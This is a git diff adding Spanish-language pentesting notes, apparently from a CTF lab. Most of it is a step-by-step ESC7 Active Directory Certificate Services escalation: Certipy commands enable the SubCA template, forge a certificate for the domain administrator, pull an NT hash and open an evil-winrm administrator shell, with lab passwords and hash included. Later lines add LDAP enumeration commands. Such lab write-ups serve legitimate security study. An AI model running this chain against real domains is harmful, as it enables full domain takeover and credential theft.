@@ -70,6 +70,167 @@
 ```
 
 --- 
+# Active Directory Certificate Services (AD CS) 
+
+Usando la herramienta Certipy, que está hecha para pentesters/red teamers y auditores de seguridad.
+
+
+En Active Directory Certificate Services (AD CS), se definieron varios escenarios de abuso llamados ESC1 a ESC8 (sigla de ESCalation), que describen configuraciones inseguras en una CA o en plantillas de certificados.
+
+🔎 ESC7: ManageCA / ManageCertificates Rights
+
+Definición:
+Ocurre cuando un usuario o grupo tiene permisos demasiado amplios sobre la Certificate Authority (CA) en AD CS, en particular:
+
+ManageCA → administrar la CA.
+
+ManageCertificates → aprobar, denegar o emitir solicitudes de certificados.
+
+⚡ ¿Por qué es peligroso?
+
+Un usuario con estos permisos puede:
+
+Habilitar plantillas inseguras (ej. SubCA, User, etc.).
+
+Modificar permisos de enrolamiento en cualquier template.
+
+Emitir certificados manualmente, incluso si no tiene derecho a solicitarlos.
+
+Otorgarse certificados a sí mismo que suplantan a cualquier usuario del dominio (incluido Administrador).
+
+En la práctica: con ESC7 puedes crear un Golden Certificate, que equivale a una llave maestra para hacer impersonation de cualquier cuenta en el dominio.
+
+📘 Ejemplo práctico de lo que hiciste:
+
+Tu usuario svcapp1 tenía el permiso ManageCA sobre la CA mentality-WIN-9FQTT7GPAVK-CA.
+
+Usaste certipy-ad para:
+
+Habilitar la plantilla SubCA.
+
+Solicitar un certificado con la identidad de administrator@mentality.thl.
+
+Forzar la emisión manual de la solicitud.
+
+Resultado: conseguiste un certificado válido como Administrador → escalaste privilegios.
+
+
+## 🔑 1. Enumeración de la CA y plantillas
+
+```bash
+certipy-ad find -u 'svcapp1' -p 'Patito12345' -dc-ip 192.168.56.107 -vulnerable -stdout
+```
+
+### 📌 ¿Qué hace?
+
+Se conecta al Domain Controller (-dc-ip) usando las credenciales de svcapp1.
+
+Enumera las Certificate Authorities (CAs) y templates de certificados disponibles en AD CS.
+
+Busca configuraciones inseguras (-vulnerable).
+
+### 👉 Resultado: Encontraste que la cuenta svcapp1 tiene permisos peligrosos (ESC7) sobre la CA → puede administrar o modificar configuraciones críticas.
+
+## 🔑 2. Agregar un officer a la CA
+```bash
+certipy-ad ca -ca 'mentality-WIN-9FQTT7GPAVK-CA' -add-officer svcapp1 -username svcapp1@mentality.thl -password 'Patito12345'
+```
+
+### 📌 ¿Qué hace?
+
+Añade al usuario svcapp1 como CA officer.
+
+Esto le da más poder de administración sobre la autoridad certificadora.
+
+### 🔑 3. Habilitar una plantilla peligrosa
+```bash
+certipy-ad ca -ca 'mentality-WIN-9FQTT7GPAVK-CA' -enable-template SubCA -username svcapp1@mentality.thl -password 'Patito12345'
+```
+
+### 📌 ¿Qué hace?
+
+Activa el template SubCA.
+
+Los templates definen quién puede solicitar qué tipo de certificado.
+
+SubCA es muy peligroso, porque permite crear certificados de subordinadas CA, que básicamente pueden emitir certificados falsos para cualquier usuario (incluso Administrador).
+
+## 🔑 4. Solicitar un certificado para impersonar al Administrador
+```bash
+certipy-ad req -ca 'mentality-WIN-9FQTT7GPAVK-CA' -template SubCA -username svcapp1@mentality.thl -password 'Patito12345' -upn administrator@mentality.thl
+```
+
+### 📌 ¿Qué hace?
+
+Envía una solicitud de certificado a la CA, usando el template SubCA.
+
+El -upn administrator@mentality.thl indica que el certificado debe ser emitido con la identidad del usuario Administrator.
+
+Esto es el núcleo de la vulnerabilidad: logras un golden certificate para el administrador.
+
+## 🔑 5. Forzar la emisión del certificado
+```bash
+certipy-ad ca -ca 'mentality-WIN-9FQTT7GPAVK-CA' -issue-request 5 -username svcapp1@mentality.thl -password 'Patito12345'
+```
+
+### 📌 ¿Qué hace?
+
+Como svcapp1 tiene permisos administrativos sobre la CA, fuerza que la solicitud ID 5 (que pediste antes) sea emitida, aunque no tuviera permisos de enrolamiento.
+
+## 🔑 6. Recuperar el certificado emitido
+```bash
+certipy-ad req -ca 'mentality-WIN-9FQTT7GPAVK-CA' -u 'svcapp1@mentality.thl' -p 'Patito12345' -target 'WIN-9FQTT7GPAVK.mentality.thl' -ns 192.168.56.107 -retrieve '5'
+```
+
+### 📌 ¿Qué hace?
+
+Descarga el certificado emitido (ID 5).
+
+Lo guarda junto con la clave privada en un archivo administrator.pfx.
+
+Ese PFX es un certificado válido para el usuario Administrador.
+
+## 🔑 7. Autenticarse con el certificado
+certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.107
+
+
+### 📌 ¿Qué hace?
+
+Usa el certificado de administrator.pfx para obtener un TGT Kerberos válido como el Administrador.
+
+También extrae el NT hash del administrador (058a4c99bab8b3d04a6bd959f95ce2b2).
+
+👉 En este punto, ya tienes credenciales reutilizables para cualquier acceso.
+
+🔑 8. Conexión final con Evil-WinRM
+```bash
+evil-winrm -i 192.168.56.107 -u administrator -H 058a4c99bab8b3d04a6bd959f95ce2b2
+```
+
+📌 ¿Qué hace?
+
+Usas el hash NTLM del administrador para abrir una sesión remota PowerShell (WinRM).
+
+Esto te da una shell de administrador en el servidor Windows.
+
+De ahí lees la root_flag.txt.
+
+📘 ¿Para qué se usa todo esto?
+
+- Certipy → Herramienta para enumerar, explotar y abusar de Active Directory Certificate Services (AD CS).
+
+- AD CS → Infraestructura de certificados en Windows que, si está mal configurada, permite ataques como:
+
+- ESC1–ESC8 → Diferentes escenarios de abuso de plantillas y permisos.
+
+- Golden Certificates → Emitir un certificado válido para cualquier usuario (incluido Administrador).
+
+- Persistencia → Como los certificados pueden durar años, se mantiene acceso incluso si cambian contraseñas.
+
+- evil-winrm → Herramienta de post-explotación para acceder vía WinRM con credenciales o hashes.
+
+
+---
 
 # 🔎 smbmap
 
@@ -646,6 +807,12 @@ Lo interesante de Kerbrute es que no requiere autenticación previa, solo acceso
 ---
 
 
+
+certipy-ad find -u 'svcapp1' -p 'Hola1234$' -dc-ip 10.0.2.6 -vulnerable -stdout
+
+
+---
+
 # 🛡️ Ataques a Active Directory (AD) - Cuentas de Servicio
 
 | Ataque                       | Desde dónde se ejecuta                  | Herramienta(s) & Descripción                                                                                   | Objetivo / Qué roba                                           |
@@ -704,3 +871,9 @@ Lo interesante de Kerbrute es que no requiere autenticación previa, solo acceso
 
 
 locate 2john | grep -v share | grep safe
+
+
+└─$ ldapsearch -x -H ldap://10.201.64.240 -b "dc=thm,dc=local"  >> ldap.txt
+
+
+└─$ nxc ldap thm.local -u '' -p '' -M get-desc-users > usarios3.txt
